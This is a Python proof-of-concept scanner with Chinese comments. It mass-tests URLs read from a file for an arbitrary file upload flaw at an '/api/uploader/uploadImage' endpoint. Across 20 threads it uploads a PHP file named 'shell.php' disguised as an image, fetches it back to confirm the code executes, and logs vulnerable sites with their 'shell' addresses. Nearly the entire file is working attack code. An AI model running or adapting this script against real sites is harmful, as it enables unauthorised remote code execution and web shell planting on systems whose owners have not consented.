import requests
import threading
from urllib.parse import urljoin
import urllib3
import json
import os

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程数
THREAD_COUNT = 20

# 定义POC数据
BOUNDARY = "----WebKitFormBoundarykvjj6DIn0LIXxe9m"
POC_DATA = f'''------{BOUNDARY}
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/gif

<?php phpinfo(); ?>
------{BOUNDARY}--'''

HEADERS = {
    'Content-Type': f'multipart/form-data; boundary={BOUNDARY}',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

# 线程锁
lock = threading.Lock()

def check_url(url):
    """检查单个URL是否存在漏洞"""
    try:
        # 清理URL
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # 第一步：上传文件
        upload_url = urljoin(url, '/api/uploader/uploadImage')
        
        with requests.Session() as session:
            session.verify = False
            
            # 发送上传请求
            response = session.post(
                upload_url,
                data=POC_DATA.encode('utf-8'),
                headers=HEADERS,
                timeout=10,
                verify=False
            )
            
            # 检查上传结果
            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get("success") is True:
                        # 第二步：访问上传的文件
                        shell_url = urljoin(url, '/upload/video/0/lwzgpe.php')
                        shell_response = session.get(shell_url, timeout=10, verify=False)
                        
                        if shell_response.status_code == 200 and 'phpinfo' in shell_response.text.lower():
                            # 漏洞存在，写入结果文件
                            with lock:
                                with open('result.txt', 'a', encoding='utf-8') as f:
                                    f.write(f"漏洞存在: {url}\n")
                                    f.write(f"上传接口: {upload_url}\n")
                                    f.write(f"Shell地址: {shell_url}\n")
                                    f.write(f"响应状态: {shell_response.status_code}\n")
                                    f.write("-" * 50 + "\n")
                            print(f"[+] 漏洞存在: {url}")
                            return True
                except (json.JSONDecodeError, KeyError):
                    pass
            
            print(f"[-] 漏洞不存在: {url}")
            return False
            
    except requests.RequestException as e:
        print(f"[!] 请求错误 {url}: {str(e)}")
        return False
    except Exception as e:
        print(f"[!] 处理错误 {url}: {str(e)}")
        return False

def main():
    """主函数"""
    # 检查URL文件是否存在
    if not os.path.exists('url.txt'):
        print("[!] url.txt 文件不存在")
        return
    
    # 读取URL列表
    with open('url.txt', 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    if not urls:
        print("[!] url.txt 中没有有效的URL")
        return
    
    print(f"[*] 开始检测 {len(urls)} 个URL，线程数: {THREAD_COUNT}")
    
    # 清空或创建结果文件
    open('result.txt', 'w').close()
    
    # 创建线程池
    threads = []
    
    # 使用线程池执行检测
    for url in urls:
        thread = threading.Thread(target=check_url, args=(url,))
        threads.append(thread)
        thread.start()
        
        # 控制并发线程数
        while threading.active_count() > THREAD_COUNT:
            threading.current_thread().join(0.1)
    
    # 等待所有线程完成
    for thread in threads:
        thread.join()
    
    print("[*] 所有URL检测完成")
    
    # 检查结果文件
    if os.path.exists('result.txt') and os.path.getsize('result.txt') > 0:
        print(f"[+] 漏洞结果已保存到 result.txt")
    else:
        print("[-] 未发现漏洞")

if __name__ == "__main__":
    main()